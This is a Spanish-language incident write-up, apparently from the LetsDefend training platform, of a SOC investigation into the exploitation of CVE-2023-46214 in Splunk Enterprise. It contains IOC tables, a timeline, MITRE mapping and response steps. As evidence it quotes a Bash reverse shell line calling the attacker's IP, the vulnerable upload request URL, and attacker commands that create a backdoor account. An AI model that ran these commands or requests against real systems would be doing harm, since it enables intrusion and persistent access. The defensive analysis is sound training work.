# SOC239 — Remote Code Execution Detected in Splunk Enterprise

**Plataforma:** LetsDefend  
**Categoría:** Web Attack / RCE  
**Dificultad:** Alta  
**Fecha de resolución:** 2023-11-21  
**CVE:** [CVE-2023-46214](https://advisory.splunk.com/advisories/SVD-2023-1104)  
**Técnicas MITRE ATT&CK:**
- [T1190 — Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)
- [T1199 — Trusted Relationship](https://attack.mitre.org/techniques/T1199/)
- [T1059.004 — Unix Shell](https://attack.mitre.org/techniques/T1059/004/)
- [T1136.001 — Create Account: Local Account](https://attack.mitre.org/techniques/T1136/001/)
- [T1210 — Exploitation of Remote Services](https://attack.mitre.org/techniques/T1210/)

**Tácticas MITRE:** Initial Access · Execution · Persistence · Lateral Movement


## 🧩 Contexto del caso

> Intento de explotación de CVE-2023-46214 en Splunk Enterprise mediante la subida de un archivo XSLT malicioso que habilita RCE. La IP atacante es china con reputación maliciosa confirmada. El atacante logró obtener reverse shell y persistencia en el sistema.

**Tipo de alerta:** SOC239 — Remote Code Execution Detected in Splunk Enterprise  
**Severidad inicial:** Medium  
**Event ID:** 201  
**Fecha y hora del evento:** Nov 21, 2023 — 12:24 PM

**Activos implicados:**
- Host: `Splunk Enterprise` (IP local: `172.16.20.13` / IP pública: `18.219.80.54`)
- IP atacante: `180.101.88.240` (China — ChinaNet Jiangsu)
- Archivos maliciosos: `shell.xsl`, `shell.sh`


## 🔍 Proceso de investigación

### 1. Triage inicial

La alerta identificaba un intento de subida de `shell.xsl` al endpoint de Splunk `/en-US/splunkd/__upload/indexing/preview` con el parámetro `input.path=shell.xsl`. El trigger reason lo dejaba claro: XSLT malicioso con potencial de RCE.

Lo primero fue contextualizar la vulnerabilidad. CVE-2023-46214 afecta a Splunk Enterprise en las versiones 9.0.0–9.0.6 y 9.1.0–9.1.1: permite a un atacante autenticado subir archivos XSLT que Splunk procesa sin sanitizar, ejecutando código arbitrario en el servidor. La condición clave es tener credenciales válidas, lo que ya dice bastante sobre cómo el atacante accedió.

Acto seguido comprobé reputación de la IP origen y fui a Log Management a reconstruir la cadena de eventos.


### 2. Análisis de evidencias

**Hallazgo 1 — IP atacante con reputación maliciosa confirmada**

> La IP `180.101.88.240` pertenece a ChinaNet Jiangsu (China) y tiene un historial de abuso masivo. No es una IP de pentest ni corporativa: es infraestructura de ataque activa.

| Campo | Valor |
|-------|-------|
| IP atacante | `180.101.88.240` |
| ISP | ChinaNet Jiangsu Province Network |
| País | China (Suzhou, Jiangsu) |
| AbuseIPDB | 12.872 reportes — 100% confianza de abuso |
| VirusTotal | 13/88 vendors — Malicious / Phishing |
| Categorías históricas | Brute Force, SSH, Phishing, Hacking |


**Hallazgo 2 — Subida de XSLT malicioso y reverse shell embebido**

> La petición POST del atacante subió un ZIP con dos archivos: `shell.xsl` (el XSLT que activa la vulnerabilidad) y `shell.sh` (el payload). El contenido de `shell.sh` es una reverse shell en Bash clásica que abre una conexión TCP hacia la IP del atacante en el puerto 1923.

| Campo | Valor |
|-------|-------|
| Método | `POST` |
| URL objetivo | `hxxp://18.219.80.54:8000/en-US/splunkd/__upload/indexing/preview?output_mode=json&props.NO_BINARY_CHECK=1&input.path=shell.xsl` |
| Archivo XSLT | `shell.xsl` — invoca `/opt/splunk/bin/scripts/shell.sh` |
| Reverse shell | `sh -i >& /dev/tcp/180.101.88.240/1923 0>&1` |
| C2 (reverse shell) | `180.101.88.240:1923` |
| Trigger file path | `/opt/splunk/var/run/splunk/dispatch/1700556926.3/shell.xsl` |


**Hallazgo 3 — Acceso con credenciales de tercero y reverse shell confirmada**

> En los proxy logs aparece el login del atacante: la request POST a `/account/login` desde `180.101.88.240` incluye en claro `Username=admin` y `Password=SPLUNK-[...]`. El Splunk no era accesible directamente desde internet (intentar acceder al puerto 8000 daba timeout), por lo que el atacante usó credenciales de un empleado o empresa tercera con acceso VPN. Técnica T1199 — Trusted Relationship.

| Campo | Valor |
|-------|-------|
| Usuario comprometido | `admin` |
| Método de acceso | Credenciales de tercero (Trusted Relationship) |
| IP origen | `180.101.88.240` |
| Puerto Splunk | `8000` |
| Response | `200` (login exitoso) |


**Hallazgo 4 — Post-explotación: creación de usuario para persistencia**

> Una vez con reverse shell, el atacante ejecutó una secuencia de comandos de reconocimiento y persistencia en el terminal del host. Creó el usuario `analsyt` (sí, con typo) y le asignó contraseña — táctica clásica de backdoor mediante cuenta local.

| Timestamp | Comando |
|-----------|---------|
| `2023-11-21 12:24:33` | `whoami` |
| `2023-11-21 12:24:37` | `groups` |
| `2023-11-21 12:24:40` | `useradd -m analsyt` |
| `2023-11-21 12:24:48` | `passwd analsyt` |

Y en el terminal history del endpoint, antes del acceso:

| Timestamp | Comando |
|-----------|---------|
| `2023-11-21 11:24:28` | `splunk start` |
| `2023-11-21 12:23:58` | `cd /opt/splunk/bin/scripts/` |
| `2023-11-21 12:24:00` | `cat shell.sh` |
| `2023-11-21 12:24:28` | `id` |


### 3. Correlación de eventos

```
[12:23 PM] — POST de 180.101.88.240 con credenciales admin → login exitoso en Splunk (puerto 8000)
[12:23 PM] — Upload de shell.xsl al endpoint vulnerable (__upload/indexing/preview)
[12:24 PM] — Splunk procesa el XSLT → ejecuta shell.sh → reverse shell establecida hacia 180.101.88.240:1923
[12:24 PM] — Firewall registra tráfico continuo desde 180.101.88.240:1923 → 18.219.80.54 (confirmación de shell activa)
[12:24 PM] — OS logs: whoami, groups, useradd -m analsyt, passwd analsyt
```

El ataque completo desde login hasta persistencia tardó menos de 2 minutos. Todo permitido por firewall sin bloqueos.


### 4. Verificación de IOCs

| IOC | Tipo | Herramienta | Resultado |
|-----|------|-------------|-----------|
| `180.101.88.240` | IP | AbuseIPDB | 12.872 reportes — 100% abuso — activa en el momento del ataque |
| `180.101.88.240` | IP | VirusTotal | 13/88 — Malicious / Phishing |
| `shell.xsl` | Archivo | Análisis manual | XSLT malicioso — invoca reverse shell via CVE-2023-46214 |
| `shell.sh` | Archivo | Análisis manual | Bash reverse shell → `180.101.88.240:1923` |
| `analsyt` | Usuario | OS logs | Cuenta creada por el atacante para persistencia |
| `admin` | Usuario | Proxy logs | Credenciales usadas para el login en Splunk |


## ✅ Conclusión y respuesta

**Veredicto:** Verdadero positivo

**Resumen del ataque:**
El atacante, usando credenciales de un usuario `admin` probablemente obtenidas de un tercero con acceso a la VPN corporativa, se autenticó en Splunk Enterprise y explotó CVE-2023-46214 subiendo un archivo XSLT malicioso que ejecutó una reverse shell en el servidor. Con acceso al sistema, el atacante realizó reconocimiento básico (whoami, groups) y creó una cuenta local (`analsyt`) para garantizarse persistencia. El Splunk no era accesible directamente desde internet, lo que indica que las credenciales o el acceso VPN estaban comprometidos previamente.

**Acciones de respuesta tomadas:**
1. Aislar el host `Splunk Enterprise` (`172.16.20.13`) desde Endpoint Security
2. Eliminar la cuenta `analsyt` creada por el atacante
3. Resetear las credenciales de la cuenta `admin` de Splunk
4. Bloquear la IP `180.101.88.240` en el firewall perimetral
5. Parchear Splunk Enterprise a la versión `9.0.7` o `9.1.2` según corresponda
6. Auditar el acceso de terceros a la VPN y rotar las credenciales comprometidas
7. Eliminar los archivos `shell.xsl` y `shell.sh` del servidor

**Clasificación final:** True Positive — Incident

## 🗺️ Mapeo MITRE ATT&CK

| Táctica | Técnica | ID | Descripción |
|---------|---------|-----|-------------|
| Initial Access | Exploit Public-Facing Application | T1190 | Explotación de CVE-2023-46214 en Splunk Enterprise via XSLT malicioso |
| Initial Access | Trusted Relationship | T1199 | Acceso con credenciales de empresa tercera con acceso a la red |
| Execution | Unix Shell | T1059.004 | Ejecución de reverse shell en Bash (`shell.sh`) |
| Persistence | Create Account: Local Account | T1136.001 | Creación del usuario `analsyt` para mantener acceso |
| Lateral Movement | Exploitation of Remote Services | T1210 | Explotación del servicio Splunk accesible internamente |


## 📚 Lecciones aprendidas

- **¿Qué aprendí técnicamente?** CVE-2023-46214 es un buen ejemplo de por qué las aplicaciones internas de seguridad también son superficie de ataque. Splunk es una herramienta del SOC pero si no está parcheada y tiene credenciales débiles o compartidas, se convierte en un vector de entrada privilegiado: el atacante pasa de tener acceso a una herramienta de monitorización a tener una shell en el servidor que la corre. El hecho de que el atacante usara credenciales de tercero también me refuerza la idea de auditar periódicamente los accesos externos y no asumir que "si está detrás de VPN, está seguro".

- **¿Qué haría diferente?** Habría buscado también si el usuario `analsyt` llegó a usarse para acceder a otros sistemas de la red (movimiento lateral), y revisado si había reglas de reenvío o tareas programadas creadas durante la sesión. Con reverse shell activa durante varios minutos, hay tiempo de sobra para dejar más puertas traseras.

---

*Writeup elaborado con fines educativos y de práctica en entorno controlado.*
